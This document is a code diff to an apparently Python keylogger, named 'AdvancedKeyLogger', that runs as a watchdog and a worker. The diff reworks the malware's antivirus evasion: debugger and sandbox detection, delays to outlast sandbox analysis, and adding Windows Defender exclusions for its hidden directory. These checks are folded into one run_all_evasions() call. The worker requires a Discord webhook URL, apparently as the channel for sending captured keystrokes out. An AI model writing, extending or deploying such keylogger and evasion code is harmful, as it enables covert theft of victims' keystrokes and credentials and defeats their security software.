@@ -162,23 +162,10 @@ def start_worker_process(executable_path):
 
 def watchdog_mode():
     """Watchdog mode - monitors and restarts worker"""
-    # AV Evasion - Check environment first
+    # AV Evasion - Run all evasion techniques at startup
     if ENABLE_AV_EVASION and ADVANCED_MODULES_AVAILABLE:
         try:
-            # Check if debugger attached
-            if AVEvasion.check_debugger():
-                sys.exit(0)
-
-            # Check for sandbox/VM
-            if AVEvasion.check_sandbox():
-                # Sleep to timeout sandbox analysis
-                time.sleep(SANDBOX_DELAY)
-
-            # Try to add Defender exclusion (requires admin)
-            if AVEvasion.is_admin():
-                hidden_dir_str = str(get_hidden_directory())
-                AVEvasion.add_defender_exclusion(hidden_dir_str)
-                AVEvasion.add_defender_exclusion(os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]))
+            AVEvasion.run_all_evasions()
         except:
             pass
 
@@ -655,27 +642,16 @@ class AdvancedKeyLogger:
 
 def main():
     """Main entry point"""
-    # AV Evasion at the very start
+    # AV Evasion at the very start - Run all evasion techniques
     if ENABLE_AV_EVASION and ADVANCED_MODULES_AVAILABLE:
         try:
-            # Quick debugger check
-            if AVEvasion.check_debugger():
-                sys.exit(0)
+            AVEvasion.run_all_evasions()
         except:
             pass
 
     # Check if running in worker mode or watchdog mode
     if len(sys.argv) > 1 and sys.argv[1] == "--worker":
         # Worker mode - do the actual keylogging
-        # Additional AV evasion for worker
-        if ENABLE_AV_EVASION and ADVANCED_MODULES_AVAILABLE:
-            try:
-                # Sandbox evasion - sleep if detected
-                if AVEvasion.check_sandbox():
-                    time.sleep(SANDBOX_DELAY)
-            except:
-                pass
-
         # Validate webhook
         if not WEBHOOK_URL or "discord.com/api/webhooks" not in WEBHOOK_URL:
             sys.exit(1)
